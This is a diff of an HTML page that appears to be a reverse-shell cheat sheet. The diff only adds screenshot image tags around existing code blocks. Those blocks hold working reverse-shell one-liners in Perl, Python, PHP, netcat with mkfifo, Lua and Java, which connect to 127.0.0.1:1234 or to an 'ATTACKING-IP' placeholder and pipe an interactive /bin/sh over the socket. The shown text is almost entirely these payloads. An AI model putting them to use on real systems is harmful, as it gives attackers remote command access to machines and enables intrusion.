@@ -144,10 +144,12 @@ rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</s
 
 <span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[127.0.0.1]:[1234]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span>
 </pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <div class="highlight"><pre><span></span><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s2">"127.0.0.1"</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">1234</span><span class="p">;</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>
 
 <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
 </pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <div class="highlight"><pre><span></span><span class="x">php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
@@ -167,8 +169,11 @@ rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</s
 
 rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc  <span class="m">127</span>.0.0.1 <span class="m">1234</span> &gt;/tmp/f
 </pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG62.jpeg"/>
+<img alt="agent" class="img-fluid" src="../images/WechatIMG63.jpeg"/></p>
 <div class="highlight"><pre><span></span><span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span>
 </pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <p>Java</p>
 <div class="highlight"><pre><span></span><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> <span class="n">as</span> <span class="n">String</span><span class="o">[])</span>
